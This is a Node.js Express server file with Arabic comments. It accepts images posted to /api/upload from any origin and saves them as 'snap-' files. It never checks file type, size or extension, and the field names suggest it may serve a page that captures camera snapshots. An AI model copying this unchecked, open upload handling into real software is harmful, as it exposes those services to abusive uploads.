const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();

// تعيين المنفذ ديناميكياً ليناسب بيئات الاستضافة السحابية أو 3000 محلياً
const PORT = process.env.PORT || 3000;

// تفعيل CORS للسماح لصفحة الـ HTML بإرسال البيانات للسيرفر
app.use(cors());

// التأكد من وجود مجلد uploads، وإذا لم يكن موجوداً يتم إنشاؤه تلقائياً
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// إعداد ملتر (Multer) لتسمية وحفظ الصور المرفوعة
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, 'snap-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ storage: storage });

// --- الواجهة الرئيسية الجديدة ---
app.get('/', (req, res) => {
    res.send('<h1 style="text-align: center; margin-top: 50px; font-family: sans-serif;">مرحباً بك</h1>');
});

// الرابط (API) المسؤول عن استقبال الصورة وحفظها
app.post('/api/upload', upload.single('captured_image'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'لم يتم استقبال أي صورة' });
    }
    console.log(`📸 تم استقبال صورة بنجاح وحفظها باسم: ${req.file.filename}`);
    
    res.status(200).json({ message: 'تم حفظ الصورة بنجاح!' });
});

// تشغيل السيرفر
app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
});
